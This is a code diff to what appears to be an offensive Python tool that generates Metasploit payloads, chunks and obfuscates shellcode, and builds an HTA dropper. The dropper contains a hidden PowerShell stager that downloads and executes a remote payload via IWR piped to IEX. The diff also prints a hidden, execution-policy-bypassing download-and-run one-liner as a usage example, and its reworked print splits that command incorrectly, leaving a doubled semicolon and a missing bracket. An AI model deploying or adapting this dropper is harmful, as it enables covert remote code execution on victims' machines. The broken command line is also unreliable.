@@ -40,11 +40,11 @@ def msfpayload_select():
 # Payload options input
 def msfpayload_options_set():
     print("Default payload options:\n" + "ListenerIP: " + defListenerIP + "\n" + "ListenerPort: " + str(defListenerPort) + "\n" + "ListenerURI: " + defListenerURI + "\n")
-    print("Default payload proxy options:\n" + "ProxyType: " + defProxyType + "\n" + "ProxyHost: " + defProxyHost + "\n" + "ProxyPort: " + str(defProxyPort) + "\n" + "ProxyUser: " + defProxyUser + "\n" + "ProxyPass: " + defProxyPass + "\n")
+    print("Default payload proxy options:\n" + "ProxyType: " + defProxyType + "\n" + "ProxyHost: " + defProxyHost + "\n" + "ProxyPort: " + str(defProxyPort) + "\n", end = '')
+    print("ProxyUser: " + defProxyUser + "\n" + "ProxyPass: " + defProxyPass + "\n")
     print("Default UserAgent: " + defUserAgent + "\n")
     print("Default Download URL: " + defDownloadURL + "\n")
     print("----------------------------------------------------------------------------------------------------")
-    
     # ListenerIP
     try:
         ListenerIP = ipaddress.ip_address(input("Enter LISTENER IP address: ") or defListenerIP)
@@ -103,7 +103,8 @@ def msfpayload_options_set():
     else:
         print("Download URL is not valid, assigning default value")
         DownloadURL = defDownloadURL
-    payload_options = "LHOST=" + str(ListenerIP) + " LPORT=" + str(ListenerPort) + " LURI=" + str(ListenerURI) + " HttpUserAgent='" + str(UserAgent) + "'" + " OverrideLHOST=" + str(ListenerIP) + " OverrideLPORT=" + str(ListenerPort) + " OverrideRequestHost=true"
+    payload_options = ("LHOST=" + str(ListenerIP) + " LPORT=" + str(ListenerPort) + " LURI=" + str(ListenerURI) + " HttpUserAgent='" + str(UserAgent)
+                       + "'" + " OverrideLHOST=" + str(ListenerIP) + " OverrideLPORT=" + str(ListenerPort) + " OverrideRequestHost=true")
     return payload_options, UserAgent, DownloadURL
 
 def generate_raw_payload(payload_type, payload_options, DownloadURL, UserAgent):
@@ -158,7 +159,7 @@ def change_payload(payload_filename):
     if chunk_size in range(49,1501):
         pass
     else:
-        print("Not a valid chunk_size entered, assigning default value 100")
+        print("Not a valid chunk_size entered, assigning default value 200")
         chunk_size = 200
     shellcode_parts = int(len(new_base64)/chunk_size) + 1
     shellcode_chunks = [new_base64[i:i+chunk_size] for i in range(0, len(new_base64), chunk_size)]
@@ -216,7 +217,13 @@ def generate_hta(DownloadURL, UserAgent, payload_filename):
     print("Preparing HTA dropper...\nDefault HTA filename: user_settings.hta")
     hta_filename = str(input("Enter filename with extension hta: ") or "user_settings.hta")
     var1 = "$"+junk_string(8); var2 = "$"+junk_string(8); var3 = "$"+junk_string(8); var4 = junk_string(8); var5 = junk_string(8)
-    hta_stager = """if([IntPtr]::Size -eq 4){""" + var1 + """=$env:windir+'\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe'}else{""" + var1 + """='powershell.exe'};""" + var2 + """=New-Object System.Diagnostics.ProcessStartInfo;""" + var2 + """.FileName=""" + var1 + """;""" + var2 + """.Arguments="[System.Net.WebRequest]::DefaultWebProxy=[System.Net.WebRequest]::GetSystemWebProxy();[System.Net.WebRequest]::DefaultWebProxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;IWR """ + DownloadURL + payload_filename + """ -UserAgent '""" + UserAgent + """'|IEX";""" + var2 + """.UseShellExecute=$false;""" + var2 + """.RedirectStandardOutput=$false;""" + var2 + """.WindowStyle='Hidden';""" + var2 + """.CreateNoWindow=$false;""" + var3 + """=[System.Diagnostics.Process]::Start(""" + var2 + """);"""
+    hta_stager = ("""if([IntPtr]::Size -eq 4){""" + var1 + """=$env:windir+'\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe'}else{"""
+                 + var1 + """='powershell.exe'};""" + var2 + """=New-Object System.Diagnostics.ProcessStartInfo;""" + var2 + """.FileName="""
+                 + var1 + """;""" + var2 + """.Arguments="[System.Net.WebRequest]::DefaultWebProxy=[System.Net.WebRequest]::GetSystemWebProxy();"""
+                 """[System.Net.WebRequest]::DefaultWebProxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;IWR """
+                 + DownloadURL + payload_filename + """ -UserAgent '""" + UserAgent + """'|IEX";""" + var2 + """.UseShellExecute=$false;"""
+                 + var2 + """.RedirectStandardOutput=$false;""" + var2 + """.WindowStyle='Hidden';""" + var2 + """.CreateNoWindow=$false;"""
+                 + var3 + """=[System.Diagnostics.Process]::Start(""" + var2 + """);""")
     hta_base64 = str(base64.b64encode(bytes(hta_stager, 'utf-16le')))[2:][:-1]
     hta_template = ("""<script language="VBScript">
   window.moveTo -4000, -4000
@@ -243,5 +250,7 @@ if __name__=='__main__':
     payload_filename = generate_raw_payload(payload, payload_options, DownloadURL, UserAgent)
     change_payload(payload_filename)
     obfuscate_payload(payload_filename)
-    print("""PSH-NET dropper usage example:\npowershell.exe -Window Hidden -Nop -Exec Bypass -C "[System.Net.WebRequest]::DefaultWebProxy=[System.Net.WebRequest]::GetSystemWebProxy();[System.Net.WebRequest]::DefaultWebProxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;IWR('""" + DownloadURL + payload_filename + """') -UserAgent '""" + UserAgent + """'|IEX" """)
+    print("""PSH-NET dropper usage example:\npowershell.exe -Window Hidden -Nop -Exec Bypass -C "[System.Net.WebRequest]::DefaultWebProxy=[System.Net.WebRequest]::GetSystemWebProxy();""", end = '')
+    print(""";System.Net.WebRequest]::DefaultWebProxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;IWR('""", end = '')
+    print(DownloadURL + payload_filename + """') -UserAgent '""" + UserAgent + """'|IEX" """)
     generate_hta(DownloadURL, UserAgent, payload_filename)
